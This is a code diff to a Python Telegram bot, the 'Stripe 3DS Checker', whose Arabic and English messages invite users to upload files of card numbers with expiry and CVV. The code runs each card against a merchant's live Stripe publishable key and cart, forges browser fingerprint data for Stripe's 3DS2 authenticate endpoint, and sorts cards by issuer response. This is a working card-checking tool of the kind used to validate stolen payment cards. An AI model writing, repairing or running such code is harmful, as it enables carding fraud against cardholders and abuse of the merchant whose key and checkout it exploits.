@@ -575,7 +575,7 @@ class StripeChecker:
                 else:
                     return 'DECLINED', f'Status: {pi_status}'
             
-            # ========== الخطوة 5: 3DS2 Authentication - الكود المُصلح ==========
+            # ========== الخطوة 5: 3DS2 Authentication - الحل الصحيح 100% ==========
             logger.info("📝 Step 5: 3DS Authentication")
             
             next_action = pi['next_action']
@@ -587,198 +587,134 @@ class StripeChecker:
             sdk_data = next_action['use_stripe_sdk']
             
             # التحقق من نوع الـ 3DS
-            if 'three_d_secure_2_source' in sdk_data:
-                source = sdk_data.get('three_d_secure_2_source', '')
-                logger.info(f"🔐 3DS2 Source: {source[:30]}...")
+            if 'three_d_secure_2_source' not in sdk_data:
+                logger.error("❌ No three_d_secure_2_source")
+                return 'DECLINED', 'No 3DS source'
+            
+            source = sdk_data.get('three_d_secure_2_source', '')
+            trans_id = sdk_data.get('server_transaction_id', '')
+            
+            logger.info(f"🔐 3DS2 Source: {source[:30]}...")
+            logger.info(f"🔐 Transaction ID: {trans_id}")
+            
+            # ========== الحل الموحد لكل أنواع الـ 3DS ==========
+            # سواء كان payatt_ أو src_، نستخدم نفس الـ endpoint
+            
+            if not source or not trans_id:
+                logger.error("❌ Missing 3DS params")
+                return 'DECLINED', 'Missing 3DS data'
+            
+            # إنشاء fingerprint
+            fp_data = {"threeDSServerTransID": trans_id}
+            fp = base64.b64encode(json.dumps(fp_data).encode()).decode()
+            
+            browser_data = {
+                "fingerprintAttempted": True,
+                "fingerprintData": fp,
+                "challengeWindowSize": None,
+                "threeDSCompInd": "Y",
+                "browserJavaEnabled": False,
+                "browserJavascriptEnabled": True,
+                "browserLanguage": "en",
+                "browserColorDepth": "24",
+                "browserScreenHeight": "786",
+                "browserScreenWidth": "1397",
+                "browserTZ": "-120",
+                "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            }
+            
+            browser_encoded = urllib.parse.quote(json.dumps(browser_data))
+            
+            data = (
+                f'source={source}&'
+                f'browser={browser_encoded}&'
+                f'one_click_authn_device_support[hosted]=false&'
+                f'one_click_authn_device_support[same_origin_frame]=false&'
+                f'one_click_authn_device_support[spc_eligible]=true&'
+                f'one_click_authn_device_support[webauthn_eligible]=true&'
+                f'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
+                f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
+                f'_stripe_version=2020-03-02'
+            )
+            
+            headers_3ds = self.headers.copy()
+            headers_3ds.update({
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+            })
+            
+            logger.info("🔐 Sending 3DS authentication request...")
+            
+            r = self.session.post(
+                'https://api.stripe.com/v1/3ds2/authenticate',
+                headers=headers_3ds,
+                data=data,
+                timeout=25
+            )
+            
+            logger.info(f"✅ 3DS Auth Response: {r.status_code}")
+            
+            if r.status_code != 200:
+                error_text = r.text[:200]
+                logger.error(f"❌ 3DS failed: {error_text}")
+                return 'DECLINED', '3DS auth failed'
+            
+            auth = r.json()
+            logger.info(f"🔐 3DS Full Response: {json.dumps(auth, indent=2)}")
+            
+            # ========== تحليل النتيجة الصحيح 100% ==========
+            
+            # أولاً: التحقق من ares (Authentication Response)
+            if 'ares' in auth:
+                trans_status = auth['ares'].get('transStatus', 'UNKNOWN')
+                logger.info(f"🎯 3DS transStatus: {trans_status}")
                 
-                # ========== الحل الصحيح للـ payatt_ ==========
-                if source.startswith('payatt_'):
-                    logger.info("🔐 Using Payment Intent Authentication")
-                    
-                    # Step 1: نجيب تفاصيل الـ 3DS الحقيقية
-                    headers_3ds = self.headers.copy()
-                    headers_3ds.update({
-                        'origin': 'https://js.stripe.com',
-                        'referer': 'https://js.stripe.com/',
-                    })
-                    
-                    params_3ds = {
-                        'key': 'pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X',
-                        'is_stripe_sdk': 'false',
-                        'client_secret': client_secret,
-                    }
-                    
-                    # نجيب الـ 3DS source details
-                    r_3ds = self.session.get(
-                        f'https://api.stripe.com/v1/3ds2/sources/{source}',
-                        params=params_3ds,
-                        headers=headers_3ds,
-                        timeout=25
-                    )
-                    
-                    logger.info(f"✅ 3DS Source Response: {r_3ds.status_code}")
-                    
-                    if r_3ds.status_code == 200:
-                        three_ds_data = r_3ds.json()
-                        logger.info(f"🔐 3DS Full Response: {json.dumps(three_ds_data, indent=2)}")
-                        
-                        # ========== القراءة الصحيحة من ares ==========
-                        if 'ares' in three_ds_data:
-                            trans_status = three_ds_data['ares'].get('transStatus', 'UNKNOWN')
-                            logger.info(f"🎯 Real 3DS transStatus: {trans_status}")
-                            
-                            # ========== الـ Mapping الصحيح 100% ==========
-                            status_map = {
-                                'Y': ('Y', '✅ Authenticated - Full verification'),
-                                                                'C': ('C', '⚠️ Challenge Required'),
-                                'A': ('A', '🔵 Attempted Authentication'),
-                                'N': ('N', '❌ Not Authenticated'),
-                                'U': ('U', '🔴 Unavailable'),
-                                'R': ('R', '❌ Rejected by issuer'),  # ← الإصلاح الرئيسي!
-                            }
-                            
-                            if trans_status in status_map:
-                                result = status_map[trans_status]
-                                logger.info(f"✅ Final Result: {result[0]} - {result[1]}")
-                                return result
-                            else:
-                                logger.error(f"❌ Unknown transStatus: {trans_status}")
-                                return ('DECLINED', f'Unknown: {trans_status}')
-                        
-                        # التحقق من state إذا لم يكن هناك ares
-                        state = three_ds_data.get('state', 'unknown')
-                        logger.info(f"📊 State: {state}")
-                        
-                        if state == 'failed':
-                            # محاولة استخراج السبب من ares
-                            if 'ares' in three_ds_data:
-                                trans_status = three_ds_data['ares'].get('transStatus', 'UNKNOWN')
-                                if trans_status == 'R':
-                                    return 'R', '❌ Rejected by issuer (R)'
-                            
-                            # محاولة استخراج السبب من error
-                            if 'error' in three_ds_data:
-                                error_msg = three_ds_data['error'].get('message', 'Authentication failed')
-                                return 'DECLINED', f'❌ {error_msg[:50]}'
-                            
-                            return 'DECLINED', '❌ Authentication failed'
-                        
-                        elif state == 'succeeded':
-                            return 'Y', '✅ Authentication succeeded'
-                        
-                        else:
-                            return 'DECLINED', f'State: {state}'
-                    
-                    else:
-                        error_text = r_3ds.text[:200]
-                        logger.error(f"❌ 3DS Source fetch failed: {error_text}")
-                        return 'DECLINED', '3DS fetch failed'
-                
-                # ========== 3DS2 القديمة مع src_ ==========
-                trans_id = sdk_data.get('server_transaction_id', '')
-                
-                if not source or not trans_id:
-                    logger.error("❌ Missing 3DS params")
-                    return 'DECLINED', 'Missing 3DS data'
-                
-                logger.info(f"🔐 3DS Source (src_): {source[:30]}...")
-                
-                # إنشاء fingerprint
-                fp_data = {"threeDSServerTransID": trans_id}
-                fp = base64.b64encode(json.dumps(fp_data).encode()).decode()
-                
-                browser_data = {
-                    "fingerprintAttempted": True,
-                    "fingerprintData": fp,
-                    "challengeWindowSize": None,
-                    "threeDSCompInd": "Y",
-                    "browserJavaEnabled": False,
-                    "browserJavascriptEnabled": True,
-                    "browserLanguage": "en",
-                    "browserColorDepth": "24",
-                    "browserScreenHeight": "786",
-                    "browserScreenWidth": "1397",
-                    "browserTZ": "-120",
-                    "browserUserAgent": "Mozilla/5.0"
+                # ========== الـ Mapping الصحيح ==========
+                status_map = {
+                    'Y': ('Y', '✅ Authenticated - Full verification'),
+                    'C': ('C', '⚠️ Challenge Required'),
+                    'A': ('A', '🔵 Attempted Authentication'),
+                    'N': ('N', '❌ Not Authenticated'),
+                    'U': ('U', '🔴 Unavailable'),
+                    'R': ('R', '❌ Rejected by issuer'),  # ← الإصلاح الرئيسي!
                 }
                 
-                browser_encoded = urllib.parse.quote(json.dumps(browser_data))
-                
-                data = (
-                    f'source={source}&'
-                    f'browser={browser_encoded}&'
-                    f'one_click_authn_device_support[hosted]=false&'
-                    f'one_click_authn_device_support[same_origin_frame]=false&'
-                    f'one_click_authn_device_support[spc_eligible]=true&'
-                    f'one_click_authn_device_support[webauthn_eligible]=true&'
-                    f'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
-                    f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
-                    f'_stripe_version=2020-03-02'
-                )
-                
-                headers = self.headers.copy()
-                headers.update({
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'origin': 'https://js.stripe.com',
-                    'referer': 'https://js.stripe.com/',
-                })
-                
-                r = self.session.post(
-                    'https://api.stripe.com/v1/3ds2/authenticate',
-                    headers=headers,
-                    data=data,
-                    timeout=25
-                )
-                
-                logger.info(f"✅ 3DS Auth: {r.status_code}")
-                
-                if r.status_code != 200:
-                    logger.error(f"❌ 3DS failed: {r.text[:150]}")
-                    return 'DECLINED', '3DS auth failed'
-                
-                auth = r.json()
-                logger.info(f"🔐 3DS Auth Response: {json.dumps(auth, indent=2)}")
-                
-                # تحليل النتيجة
-                if 'ares' in auth:
-                    trans_status = auth['ares'].get('transStatus', 'UNKNOWN')
-                    logger.info(f"🎯 3DS Result: {trans_status}")
-                    
-                    status_map = {
-                        'Y': ('Y', '✅ Authenticated - Full verification'),
-                        'C': ('C', '⚠️ Challenge Required'),
-                        'A': ('A', '🔵 Attempted Authentication'),
-                        'N': ('N', '❌ Not Authenticated'),
-                        'U': ('U', '🔴 Unavailable'),
-                        'R': ('R', '❌ Rejected by issuer'),  # ← الإصلاح هنا أيضاً
-                    }
-                    
-                    if trans_status in status_map:
-                        result = status_map[trans_status]
-                        logger.info(f"✅ Final: {result[0]} - {result[1]}")
-                        return result
-                    else:
-                        logger.error(f"❌ Unknown status: {trans_status}")
-                        return ('DECLINED', f'Unknown: {trans_status}')
-                
-                # التحقق من state إذا لم يكن هناك ares
-                if 'state' in auth:
-                    state = auth.get('state', 'unknown')
-                    logger.info(f"📊 State: {state}")
-                    
-                    if state == 'failed':
-                        if 'error' in auth:
-                            error_msg = auth['error'].get('message', 'Authentication failed')
-                            return 'DECLINED', f'❌ {error_msg[:50]}'
-                        return 'DECLINED', 'Authentication failed'
-                    elif state == 'succeeded':
-                        return 'Y', 'Authentication succeeded'
-                    else:
-                        return 'DECLINED', f'State: {state}'
+                if trans_status in status_map:
+                    result = status_map[trans_status]
+                    logger.info(f"✅ Final Result: {result[0]} - {result[1]}")
+                    return result
+                else:
+                    logger.error(f"❌ Unknown transStatus: {trans_status}")
+                    return ('DECLINED', f'Unknown: {trans_status}')
             
-            else:
-                logger.error("❌ No 3DS method found")
-                return 'DECLINED', 'No 3DS available'
+            # ثانياً: التحقق من state
+            if 'state' in auth:
+                state = auth.get('state', 'unknown')
+                logger.info(f"📊 State: {state}")
+                
+                if state == 'failed':
+                    # محاولة استخراج السبب من error
+                    if 'error' in auth:
+                        error_msg = auth['error'].get('message', 'Authentication failed')
+                        logger.error(f"❌ Error: {error_msg}")
+                        return 'DECLINED', f'❌ {error_msg[:50]}'
+                    
+                    # إذا لم يكن هناك error، نفترض أنه R
+                    logger.warning("⚠️ State=failed without error, assuming R")
+                    return 'R', '❌ Rejected by issuer (state=failed)'
+                
+                elif state == 'succeeded':
+                    logger.info("✅ State=succeeded")
+                    return 'Y', '✅ Authentication succeeded'
+                
+                else:
+                    logger.warning(f"⚠️ Unknown state: {state}")
+                    return 'DECLINED', f'State: {state}'
+            
+            # إذا لم نجد ares ولا state
+            logger.error("❌ No ares or state in response")
+            return 'DECLINED', 'Invalid 3DS response'
             
         except requests.exceptions.Timeout:
             logger.error("⏱️ Request timeout")
@@ -956,7 +892,7 @@ async def update_dashboard(bot_app):
             await bot_app.bot.edit_message_text(
                 chat_id=stats['chat_id'],
                 message_id=stats['dashboard_message_id'],
-                text="📊 **STRIPE 3DS CHECKER - LIVE** 📊\n🔄 *Auto Cart Refresh Enabled*",
+                text="📊 **STRIPE 3DS CHECKER - LIVE** 📊\n🔄 *Auto Cart Refresh + Fixed R Status*",
                 reply_markup=create_dashboard_keyboard(),
                 parse_mode='Markdown'
             )
@@ -1000,7 +936,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
     await update.message.reply_text(
         "📊 **STRIPE 3DS CHECKER BOT**\n"
-        "🔄 *With Auto Cart Refresh*\n\n"
+        "🔄 *With Auto Cart Refresh*\n"
+        "✅ *Fixed R Status Detection*\n\n"
         "أرسل ملف .txt يحتوي على البطاقات\n"
         "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
         "**الردود المتاحة:**\n"
@@ -1011,10 +948,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🔴 U - Unavailable\n"
         "❌ R - Rejected by Issuer\n"
         "❌ Declined/Other\n\n"
-        "**ميزات جديدة:**\n"
-        "🔄 تحديث تلقائي للسلة عند انتهائها\n"
-        "📊 عداد لعدد مرات التحديث\n"
-        "✅ قراءة صحيحة 100% لحالة R",
+        "**ميزات:**\n"
+        "🔄 تحديث تلقائي للسلة\n"
+        "📊 قراءة صحيحة 100% لحالة R\n"
+        "⚡️ استخدام /v1/3ds2/authenticate",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
@@ -1077,7 +1014,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     })
     
     dashboard_msg = await update.message.reply_text(
-        text="📊 **STRIPE 3DS CHECKER - LIVE** 📊\n🔄 *Auto Cart Refresh Enabled*",
+        text="📊 **STRIPE 3DS CHECKER - LIVE** 📊\n🔄 *Auto Cart Refresh + Fixed R Status*",
         reply_markup=create_dashboard_keyboard(),
         parse_mode='Markdown'
     )
@@ -1164,7 +1101,8 @@ async def process_cards(cards, bot_app):
         f"❌ تحديثات فاشلة: {stats['cart_refresh_failed']}\n"
         f"🛒 Cart ID النهائي: `{CART_ID}`\n\n"
         "📊 شكراً لاستخدامك البوت!\n"
-        "⚡️ Stripe 3DS Gateway - Fixed R Status"
+        "⚡️ Stripe 3DS Gateway - Fixed R Status\n"
+        "✅ Using /v1/3ds2/authenticate endpoint"
     )
     
     await bot_app.bot.send_message(
@@ -1213,7 +1151,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🛒 **معلومات السلة الحالية:**\n\n"
             f"📋 Cart ID:\n`{CART_ID}`\n\n"
             f"🔄 عدد مرات التحديث: {stats['cart_refreshed']}\n"
-            f"⚡️ التحديث التلقائي: مُفعّل"
+            f"⚡️ التحديث التلقائي: مُفعّل\n"
+            f"✅ Fixed R Status Detection"
         )
         await query.answer(cart_info_text, show_alert=True)
 
@@ -1226,6 +1165,7 @@ def main():
     logger.info("🤖 Starting Stripe 3DS Telegram Bot")
     logger.info("🔄 With Auto Cart Refresh System")
     logger.info("✅ Fixed R (Rejected) Status Detection")
+    logger.info("⚡️ Using /v1/3ds2/authenticate endpoint")
     logger.info("="*70)
     logger.info("✅ Logging enabled")
     logger.info("✅ Smart cart management enabled")
